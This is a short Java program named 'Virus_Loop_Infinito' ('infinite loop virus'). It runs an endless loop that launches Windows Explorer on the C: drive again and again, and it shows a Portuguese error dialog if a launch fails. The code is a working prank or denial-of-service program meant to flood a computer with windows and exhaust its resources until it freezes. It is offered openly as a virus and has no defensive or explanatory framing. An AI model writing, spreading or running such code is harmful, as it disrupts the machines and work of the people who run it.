import javax.swing.*;

public class Virus_Loop_Infinito {
    public static void main(String[] args) {
        while (true) try {
            Runtime.getRuntime().exec("explorer c:\\");
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, "Ocorreu um erro!", "Erro", 0);
        }
    }
}